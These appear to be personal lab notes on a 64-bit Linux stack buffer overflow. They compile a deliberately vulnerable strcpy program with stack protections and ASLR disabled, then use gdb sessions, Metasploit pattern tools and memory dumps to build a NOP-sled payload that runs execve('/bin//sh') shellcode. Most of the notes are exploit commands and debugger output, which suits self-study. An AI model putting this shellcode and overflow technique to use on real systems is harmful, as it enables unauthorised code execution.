### STACK BASED BUFFER OVERFLOW ON 64 BIT LINUX - Using shellcode - Not ret2libc

* http://old-releases.ubuntu.com/releases/17.10/
* https://www.ret2rop.com/2018/08/stack-based-buffer-overflow-x64.html
* http://old-releases.ubuntu.com/releases/17.10/ubuntu-17.10.1-server-amd64.iso
* http://old-releases.ubuntu.com/releases/17.10/ubuntu-17.10-server-arm64.iso

```shell

VBoxManage list bridgedifs

ssh ubuntuamd@192.168.0.34

ubuntuamd@ubuntuamd:~/smash$  lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 17.10
Release:	17.10
Codename:	artful

https://wimantis.ninja/fixing-ubuntu-17-04-apt-get-update-release-file-not-found/

The solution is pretty simple, just replace us.archive.ubuntu.com and security.ubuntu.com in /etc/apt/sources.list with old-releases.ubuntu.com and then you'll be able to finish updating.

BUT ! You won't receive further security updates and will still be vulnerable to Meltdown and Spectre !


https://askubuntu.com/questions/5763/upgrading-from-the-command-line?fbclid=IwAR19ga18Xoya-ZYilDzlU0c5Z_sgg_FAQEZI_BJFhudZUN-uFSctKjEHUVk
sudo apt-get install update-manager-core
sudo do-release-upgrade

install 18.04 instead of an upgrade from 17.10

ubuntu@ubuntu:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.2 LTS
Release:	18.04
Codename:	bionic
ubuntu@ubuntu:~$ 

buf.c

#include<stdio.h>
#include<string.h>
int main(int argc, char *argv[])
{
char buf[100];
strcpy(buf,argv[1]);
printf("Input was: %s\n",buf);
return 0;
}

sudo apt install gcc
gcc -fno-stack-protector -z execstack buf.c -o buf

$ ./buf aaaa
Input was: aaaa

https://www.ret2rop.com/2018/08/stack-based-buffer-overflow-x64.html
sudo nano /proc/sys/kernel/randomize_va_space
set 2 to 0. Set it back again to 2 ,to turn on aslr. 


ubuntu@ubuntu:~/smash$ find / -user root -perm -4000 2>/dev/null
/snap/core/6350/bin/mount
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount
/snap/core/6350/usr/bin/chfn
/snap/core/6350/usr/bin/chsh
/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp
/snap/core/6350/usr/bin/passwd
/snap/core/6350/usr/bin/sudo
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd
/bin/ping
/bin/su
/bin/umount
/bin/mount
/bin/ntfs-3g
/bin/fusermount
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/traceroute6.iputils

 sudo apt install gdb

 ubuntu@ubuntu:~/smash$ gdb -q buf
Reading symbols from buf...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x000000000000068a <+0>:	push   %rbp
   0x000000000000068b <+1>:	mov    %rsp,%rbp
   0x000000000000068e <+4>:	add    $0xffffffffffffff80,%rsp
   0x0000000000000692 <+8>:	mov    %edi,-0x74(%rbp)
   0x0000000000000695 <+11>:	mov    %rsi,-0x80(%rbp)
   0x0000000000000699 <+15>:	mov    -0x80(%rbp),%rax
   0x000000000000069d <+19>:	add    $0x8,%rax
   0x00000000000006a1 <+23>:	mov    (%rax),%rdx
   0x00000000000006a4 <+26>:	lea    -0x70(%rbp),%rax
   0x00000000000006a8 <+30>:	mov    %rdx,%rsi
   0x00000000000006ab <+33>:	mov    %rax,%rdi
   0x00000000000006ae <+36>:	callq  0x550 <strcpy@plt>
   0x00000000000006b3 <+41>:	lea    -0x70(%rbp),%rax
   0x00000000000006b7 <+45>:	mov    %rax,%rsi
   0x00000000000006ba <+48>:	lea    0xa3(%rip),%rdi        # 0x764
   0x00000000000006c1 <+55>:	mov    $0x0,%eax
   0x00000000000006c6 <+60>:	callq  0x560 <printf@plt>
   0x00000000000006cb <+65>:	mov    $0x0,%eax
   0x00000000000006d0 <+70>:	leaveq 
   0x00000000000006d1 <+71>:	retq   
End of assembler dump.


(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x000000000000068a <+0>:	push   rbp
   0x000000000000068b <+1>:	mov    rbp,rsp
   //prologue
   0x000000000000068e <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000000692 <+8>:	mov    DWORD PTR [rbp-0x74],edi
   0x0000000000000695 <+11>:	mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000000699 <+15>:	mov    rax,QWORD PTR [rbp-0x80]
   0x000000000000069d <+19>:	add    rax,0x8
   0x00000000000006a1 <+23>:	mov    rdx,QWORD PTR [rax]
   0x00000000000006a4 <+26>:	lea    rax,[rbp-0x70]
   0x00000000000006a8 <+30>:	mov    rsi,rdx
   0x00000000000006ab <+33>:	mov    rdi,rax
   0x00000000000006ae <+36>:	call   0x550 <strcpy@plt>
   0x00000000000006b3 <+41>:	lea    rax,[rbp-0x70]
   0x00000000000006b7 <+45>:	mov    rsi,rax
   0x00000000000006ba <+48>:	lea    rdi,[rip+0xa3]        # 0x764
   0x00000000000006c1 <+55>:	mov    eax,0x0
   0x00000000000006c6 <+60>:	call   0x560 <printf@plt>
   0x00000000000006cb <+65>:	mov    eax,0x0
   0x00000000000006d0 <+70>:	leave  
   0x00000000000006d1 <+71>:	ret    
//epilogue
End of assembler dump.


(gdb) r $(python -c "print 'A'*126")
Starting program: /home/ubuntu/smash/buf $(python -c "print 'A'*126")
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
(gdb) 

(gdb) info registers
rax            0x0	0
rbx            0x0	0
rcx            0x0	0
rdx            0x0	0
rsi            0x555555756260	93824994337376
rdi            0x1	1
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffffffe3f0	0x7fffffffe3f0
r8             0x0	0
r9             0x7e	126
r10            0xffffff82	4294967170
r11            0x246	582
r12            0x555555554580	93824992232832
r13            0x7fffffffe4c0	140737488348352
r14            0x0	0
r15            0x0	0
rip            0x414141414141	0x414141414141
eflags         0x10202	[ IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) 


rip is also called program counter and contains address of next instruction to be executed


https://www.ret2rop.com/2018/08/stack-based-buffer-overflow-x64.html

/opt/metasploit-framework/embedded/framework/tools/exploit/

$ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 130
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A

$ gdb buf


(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A
Starting program: /home/ubuntu/smash/buf Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A
Input was: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A

Program received signal SIGSEGV, Segmentation fault.
0x0000559fa533c6d1 in main ()

(gdb) i r
rax            0x0	0
rbx            0x0	0
rcx            0x0	0
rdx            0x0	0
rsi            0x559fa7477260	94144194638432
rdi            0x1	1
rbp            0x3964413864413764	0x3964413864413764
rsp            0x7fff959c75b8	0x7fff959c75b8
r8             0x0	0
r9             0x82	130
r10            0xffffff7e	4294967166
r11            0x246	582
r12            0x559fa533c580	94144159794560
r13            0x7fff959c7690	140735703447184
r14            0x0	0
r15            0x0	0
rip            0x559fa533c6d1	0x559fa533c6d1 <main+71>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) 


pattern_offset.rb -q 3964413864413764

/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 3964413864413764

ubuntu@ubuntu:~/smash$ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 3964413864413764
[*] Exact match at offset 112
ubuntu@ubuntu:~/smash$ 

\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05


r $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")

(gdb) 
(gdb) r $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")
Starting program: /home/ubuntu/smash/buf $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBBCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x0000434343434343 in ?? ()


Program received signal SIGSEGV, Segmentation fault.
0x0000434343434343 in ?? ()
(gdb) x/100x $rsp-200
0x7ffeb20e48f8:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffeb20e4908:	0xb20e4930	0x00007ffe	0xffffffff	0x00000000
0x7ffeb20e4918:	0x00000000	0x00000000	0xb214f268	0x00007ffe
0x7ffeb20e4928:	0x0569e6cb	0x00005561	0xb20e4a98	0x00007ffe
0x7ffeb20e4938:	0x00000000	0x00000002	0x41414141	0x41414141
0x7ffeb20e4948:	0x41414141	0x41414141	0x41414141	0x41414141
0x7ffeb20e4958:	0x41414141	0x41414141	0x41414141	0x41414141
0x7ffeb20e4968:	0x41414141	0x41414141	0x41414141	0x41414141
0x7ffeb20e4978:	0x41414141	0x41414141	0x41414141	0x41414141
0x7ffeb20e4988:	0x41414141	-------------------.>>> 0xd2314850	0x48f63148	0x69622fbb
0x7ffeb20e4998:	0x732f2f6e	0x5f545368	0x050f3bb0	0x41414141
0x7ffeb20e49a8:	0x41414141	0x41414141	0x42424242	0x42424242
0x7ffeb20e49b8:	0x43434343	0x00004343	0x00000002	0x00000000
0x7ffeb20e49c8:	0xb20e4a98	0x00007ffe	0x00008000	0x00000002
0x7ffeb20e49d8:	0x0569e68a	0x00005561	0x00000000	0x00000000
0x7ffeb20e49e8:	0xb267c4a5	0xa3fe4b54	0x0569e580	0x00005561
0x7ffeb20e49f8:	0xb20e4a90	0x00007ffe	0x00000000	0x00000000
0x7ffeb20e4a08:	0x00000000	0x00000000	0xec27c4a5	0xf6c1259b
0x7ffeb20e4a18:	0x2939c4a5	0xf64b6931	0x00000000	0x00007ffe
0x7ffeb20e4a28:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffeb20e4a38:	0x94992733	0x00007fbb	0x94978638	0x00007fbb
0x7ffeb20e4a48:	0x20b57719	0x00000000	0x00000000	0x00000000
0x7ffeb20e4a58:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffeb20e4a68:	0x0569e580	0x00005561	0xb20e4a90	0x00007ffe
0x7ffeb20e4a78:	0x0569e5aa	0x00005561	0xb20e4a88	0x00007ffe


0x7ffeb20e4988 +0x4 = 0x7ffeb20e4988   89 8a 8b 8c = 0x7ffeb20e498c


\x8c\x49\x0e\xb2\xfe\x7f


r $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x8c\x49\x0e\xb2\xfe\x7f'")

(gdb) x/100x $rsp-200
0x7ffdd5f9b758:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffdd5f9b768:	0xd5f9b790	0x00007ffd	0xffffffff	0x00000000
0x7ffdd5f9b778:	0x00000000	0x00000000	0xd5fbf268	0x00007ffd
0x7ffdd5f9b788:	0xb91486cb	0x000055bc	0xd5f9b8f8	0x00007ffd
0x7ffdd5f9b798:	0x00000000	0x00000002	0x41414141	0x41414141
0x7ffdd5f9b7a8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7ffdd5f9b7b8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7ffdd5f9b7c8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7ffdd5f9b7d8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7ffdd5f9b7e8:	0x41414141	0xd2314850	0x48f63148	0x69622fbb
0x7ffdd5f9b7f8:	0x732f2f6e	0x5f545368	0x050f3bb0	0x41414141
0x7ffdd5f9b808:	0x41414141	0x41414141	0x42424242	0x42424242
0x7ffdd5f9b818:	0xb20e498c	0x00007ffe	0x00000002	0x00000000
0x7ffdd5f9b828:	0xd5f9b8f8	0x00007ffd	0x00008000	0x00000002
0x7ffdd5f9b838:	0xb914868a	0x000055bc	0x00000000	0x00000000
0x7ffdd5f9b848:	0x5752f7f0	0x905bbb66	0xb9148580	0x000055bc
0x7ffdd5f9b858:	0xd5f9b8f0	0x00007ffd	0x00000000	0x00000000
0x7ffdd5f9b868:	0x00000000	0x00000000	0x2ad2f7f0	0xc4d962bc
0x7ffdd5f9b878:	0x2c0cf7f0	0xc42116ca	0x00000000	0x00007ffd
0x7ffdd5f9b888:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffdd5f9b898:	0xf000b733	0x00007f81	0xefff1638	0x00007f81
0x7ffdd5f9b8a8:	0x27bcd9f6	0x00000000	0x00000000	0x00000000
0x7ffdd5f9b8b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffdd5f9b8c8:	0xb9148580	0x000055bc	0xd5f9b8f0	0x00007ffd
0x7ffdd5f9b8d8:	0xb91485aa	0x000055bc	0xd5f9b8e8	0x00007ffd
(gdb) 


 r $(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")

 (gdb) x/60x $rsp-200
0x7ffd3bc76168:	0x00000000	0x00000000	0x00000000	0x00000000
0x7ffd3bc76178:	0x3bc761a0	0x00007ffd	0xffffffff	0x00000000
0x7ffd3bc76188:	0x00000000	0x00000000	0x3bd54268	0x00007ffd
0x7ffd3bc76198:	0xb5d746cb	0x000055f5	0x3bc76308	0x00007ffd
0x7ffd3bc761a8:	0x00000000	0x00000002	0x90909090	0x90909090
0x7ffd3bc761b8:	0x90909090	0x90909090	0x90909090	0x90909090
0x7ffd3bc761c8:	0x90909090	0x90909090	0x90909090	0x90909090
0x7ffd3bc761d8:	0x90909090	0x90909090	0x90909090	0x90909090
0x7ffd3bc761e8:	0x90909090	0x90909090	0x90909090	0x90909090
0x7ffd3bc761f8:	0x90909090	0xd2314850	0x48f63148	0x69622fbb
0x7ffd3bc76208:	0x732f2f6e	0x5f545368	0x050f3bb0	0x41414141
0x7ffd3bc76218:	0x41414141	0x41414141	0x42424242	0x42424242
0x7ffd3bc76228:	0x43434343	0x00004343	0x00000002	0x00000000
0x7ffd3bc76238:	0x3bc76308	0x00007ffd	0x00008000	0x00000002
0x7ffd3bc76248:	0xb5d7468a	0x000055f5	0x00000000	0x0000000

0x7ffd3bc761f8
0x7ffd3bc761f8

 r $(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\xf8\x61\xc7\x3b\xfd\x7f'")

\xf8\x61\xc7\x3b\xfd\x7f


gdb-peda$  x/60x $rsp-200
0x7ffc79f881b0:	0x00007f972155fa98	0x0000000000000000
0x7ffc79f881c0:	0x0000000000000000	0x00007ffc79f881f0
0x7ffc79f881d0:	0x00000000ffffffff	0x0000000000000000
0x7ffc79f881e0:	0x00007ffc79fad268	0x0000561dea9766cb
0x7ffc79f881f0:	0x00007ffc79f88358	0x0000000200000000
0x7ffc79f88200:	0x9090909090909090	0x9090909090909090
0x7ffc79f88210:	0x9090909090909090	0x9090909090909090
0x7ffc79f88220:	0x9090909090909090	0x9090909090909090
0x7ffc79f88230:	0x9090909090909090	0x9090909090909090
0x7ffc79f88240:	0x9090909090909090	0xd231485090909090
0x7ffc79f88250:	0x69622fbb48f63148	0x5f545368732f2f6e
0x7ffc79f88260:	0x41414141050f3bb0	0x4141414141414141
0x7ffc79f88270:	0x4242424242424242	0x00007ffd3bc761f8
0x7ffc79f88280:	0x0000000000000002	0x00007ffc79f88358
0x7ffc79f88290:	0x0000000200008000	0x0000561dea97668a
0x7ffc79f882a0:	0x0000000000000000	0x026c525a7c8c4ec8
0x7ffc79f882b0:	0x0000561dea976580	0x00007ffc79f88350
0x7ffc79f882c0:	0x0000000000000000	0x0000000000000000
0x7ffc79f882d0:	0x51af7485b44c4ec8	0x5179c69867d24ec8
0x7ffc79f882e0:	0x00007ffc00000000	0x0000000000000000
0x7ffc79f882f0:	0x0000000000000000	0x00007f9721346733
0x7ffc79f88300:	0x00007f972132c638	0x0000000021512ade
0x7ffc79f88310:	0x0000000000000000	0x0000000000000000
0x7ffc79f88320:	0x0000000000000000	0x0000561dea976580
0x7ffc79f88330:	0x00007ffc79f88350	0x0000561dea9765aa
0x7ffc79f88340:	0x00007ffc79f88348	0x000000000000001c
0x7ffc79f88350:	0x0000000000000002	0x00007ffc79f896e1
0x7ffc79f88360:	0x00007ffc79f896f8	0x0000000000000000
0x7ffc79f88370:	0x00007ffc79f89777	0x00007ffc79f89d63
0x7ffc79f88380:	0x00007ffc79f89d95	0x00007ffc79f89db7
gdb-peda$ aslr
ASLR is OFF
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : ENABLED
RELRO     : FULL

0x7ffd3bc761b8

 r $(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\xf8\x61\xc7\x3b\xfd\x7f'")

Invalid $PC address: 0x7ffd3bc761f8
[------------------------------------stack-------------------------------------]
0000| 0x7fffbd7cfcc0 --> 0x2 
0008| 0x7fffbd7cfcc8 --> 0x7fffbd7cfd98 --> 0x7fffbd7d16e1 ("/home/ubuntu/smash/buf")
0016| 0x7fffbd7cfcd0 --> 0x200008000 
0024| 0x7fffbd7cfcd8 --> 0x55601451768a (<main>:	push   rbp)
0032| 0x7fffbd7cfce0 --> 0x0 
0040| 0x7fffbd7cfce8 --> 0x8709ca9897f6070e 
0048| 0x7fffbd7cfcf0 --> 0x556014517580 (<_start>:	xor    ebp,ebp)
0056| 0x7fffbd7cfcf8 --> 0x7fffbd7cfd90 --> 0x2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007ffd3bc761f8 in ?? ()

0x 7f fd 3b c7 61 b8

\xb8\x61\xc7\x3b\xfd\x7f

 r $(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\xb8\x61\xc7\x3b\xfd\x7f'")

0x7ffdc95ef428


\x28\xf4\x5e\xc9\xfd\x7f

 r $(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x28\xf4\x5e\xc9\xfd\x7f'")


gdb-peda$ vmmap
Start              End                Perm	Name
0x00005583a94b4000 0x00005583a94b5000 r-xp	/home/ubuntu/smash/buf
0x00005583a96b4000 0x00005583a96b5000 r-xp	/home/ubuntu/smash/buf
0x00005583a96b5000 0x00005583a96b6000 rwxp	/home/ubuntu/smash/buf
0x00005583a9dd9000 0x00005583a9dfa000 rwxp	[heap]
0x00007f2ff65c5000 0x00007f2ff67ac000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007f2ff67ac000 0x00007f2ff69ac000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007f2ff69ac000 0x00007f2ff69b0000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007f2ff69b0000 0x00007f2ff69b2000 rwxp	/lib/x86_64-linux-gnu/libc-2.27.so
0x00007f2ff69b2000 0x00007f2ff69b6000 rwxp	mapped
0x00007f2ff69b6000 0x00007f2ff69dd000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007f2ff6bd4000 0x00007f2ff6bd6000 rwxp	mapped
0x00007f2ff6bdd000 0x00007f2ff6bde000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007f2ff6bde000 0x00007f2ff6bdf000 rwxp	/lib/x86_64-linux-gnu/ld-2.27.so
0x00007f2ff6bdf000 0x00007f2ff6be0000 rwxp	mapped
0x00007fff5b8be000 0x00007fff5b8df000 rwxp	[stack]
0x00007fff5b911000 0x00007fff5b914000 r--p	[vvar]
0x00007fff5b914000 0x00007fff5b916000 r-xp	[vdso]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
gdb-peda$ 

gdb-peda$ pdisass 0x55c7cef58580
Dump of assembler code from 0x55c7cef58580 to 0x55c7cef585a0::	Dump of assembler code from 0x55c7cef58580 to 0x55c7cef585a0:
   0x000055c7cef58580 <_start+0>:	xor    ebp,ebp
   0x000055c7cef58582 <_start+2>:	mov    r9,rdx
   0x000055c7cef58585 <_start+5>:	pop    rsi
   0x000055c7cef58586 <_start+6>:	mov    rdx,rsp
   0x000055c7cef58589 <_start+9>:	and    rsp,0xfffffffffffffff0
   0x000055c7cef5858d <_start+13>:	push   rax
   0x000055c7cef5858e <_start+14>:	push   rsp
   0x000055c7cef5858f <_start+15>:	lea    r8,[rip+0x1ba]        # 0x55c7cef58750 <__libc_csu_fini>
   0x000055c7cef58596 <_start+22>:	lea    rcx,[rip+0x143]        # 0x55c7cef586e0 <__libc_csu_init>
   0x000055c7cef5859d <_start+29>:	lea    rdi,[rip+0xe6]        # 0x55c7cef5868a <main>
End of assembler dump.


gdb-peda$ pdisass 0x7ffdc95ef428

gdb-peda$ 



gdb-peda$ pdisass 0x7fffe7926860
Dump of assembler code from 0x7fffe7926860 to 0x7fffe7926880::	Dump of assembler code from 0x7fffe7926860 to 0x7fffe7926880:
   0x00007fffe7926860:	nop
   0x00007fffe7926861:	nop
   0x00007fffe7926862:	nop
   0x00007fffe7926863:	nop
   0x00007fffe7926864:	nop
   0x00007fffe7926865:	nop
   0x00007fffe7926866:	nop
   0x00007fffe7926867:	nop
   0x00007fffe7926868:	nop
   0x00007fffe7926869:	nop
   0x00007fffe792686a:	nop
   0x00007fffe792686b:	nop
   0x00007fffe792686c:	push   rax
   0x00007fffe792686d:	xor    rdx,rdx
   0x00007fffe7926870:	xor    rsi,rsi
   0x00007fffe7926873:	movabs rbx,0x68732f2f6e69622f
   0x00007fffe792687d:	push   rbx
   0x00007fffe792687e:	push   rsp
   0x00007fffe792687f:	pop    rdi
End of assembler dump.

gcc -no-pie -fno-stack-protector -z execstack buf.c -o buf 


----------------------- working

without PIE


-no-pie

ubuntu@ubuntu:~/smash$ gcc -no-pie -fno-stack-protector -z execstack buf.c -o buf 
ubuntu@ubuntu:~/smash$ gdb buf
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from buf...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$ aslr
ASLR is OFF

gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400537 <+0>:	push   rbp
   0x0000000000400538 <+1>:	mov    rbp,rsp
   0x000000000040053b <+4>:	add    rsp,0xffffffffffffff80
   0x000000000040053f <+8>:	mov    DWORD PTR [rbp-0x74],edi
   0x0000000000400542 <+11>:	mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000400546 <+15>:	mov    rax,QWORD PTR [rbp-0x80]
   0x000000000040054a <+19>:	add    rax,0x8
   0x000000000040054e <+23>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400551 <+26>:	lea    rax,[rbp-0x70]
   0x0000000000400555 <+30>:	mov    rsi,rdx
   0x0000000000400558 <+33>:	mov    rdi,rax
   0x000000000040055b <+36>:	call   0x400430 <strcpy@plt>
   0x0000000000400560 <+41>:	lea    rax,[rbp-0x70]
   0x0000000000400564 <+45>:	mov    rsi,rax
   0x0000000000400567 <+48>:	lea    rdi,[rip+0x96]        # 0x400604
   0x000000000040056e <+55>:	mov    eax,0x0
   0x0000000000400573 <+60>:	call   0x400440 <printf@plt>
   0x0000000000400578 <+65>:	mov    eax,0x0
   0x000000000040057d <+70>:	leave  
   0x000000000040057e <+71>:	ret    
End of assembler dump.

with PIE

Dump of assembler code for function main:
   0x000000000000068a <+0>:	push   rbp
   0x000000000000068b <+1>:	mov    rbp,rsp
   //prologue
   0x000000000000068e <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000000692 <+8>:	mov    DWORD PTR [rbp-0x74],edi
   0x0000000000000695 <+11>:	mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000000699 <+15>:	mov    rax,QWORD PTR [rbp-0x80]
   0x000000000000069d <+19>:	add    rax,0x8
   0x00000000000006a1 <+23>:	mov    rdx,QWORD PTR [rax]
   0x00000000000006a4 <+26>:	lea    rax,[rbp-0x70]
   0x00000000000006a8 <+30>:	mov    rsi,rdx
   0x00000000000006ab <+33>:	mov    rdi,rax
   0x00000000000006ae <+36>:	call   0x550 <strcpy@plt>
   0x00000000000006b3 <+41>:	lea    rax,[rbp-0x70]
   0x00000000000006b7 <+45>:	mov    rsi,rax
   0x00000000000006ba <+48>:	lea    rdi,[rip+0xa3]        # 0x764
   0x00000000000006c1 <+55>:	mov    eax,0x0
   0x00000000000006c6 <+60>:	call   0x560 <printf@plt>
   0x00000000000006cb <+65>:	mov    eax,0x0
   0x00000000000006d0 <+70>:	leave  
   0x00000000000006d1 <+71>:	ret    
//epilogue
End of assembler dump.


r $(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")

RSP: 0x7fffffffe3d0 --> 0x2 

gdb-peda$ x/60x $rsp-200
0x7fffffffe300:	0x00007ffff7ffea98	0x0000000000000000
0x7fffffffe310:	0x0000000000000000	0x00007fffffffe340
0x7fffffffe320:	0x0000000000000000	0x00007ffff7ffe170
0x7fffffffe330:	0x0000000000000001	0x0000000000400578
0x7fffffffe340:	0x00007fffffffe4a8	0x0000000200000000
0x7fffffffe350:	0x9090909090909090	0x9090909090909090
0x7fffffffe360:	0x9090909090909090	0x9090909090909090
0x7fffffffe370:	0x9090909090909090	0x9090909090909090
0x7fffffffe380:	0x9090909090909090	0x9090909090909090
0x7fffffffe390:	0x9090909090909090	0xd231485090909090
0x7fffffffe3a0:	0x69622fbb48f63148	0x5f545368732f2f6e
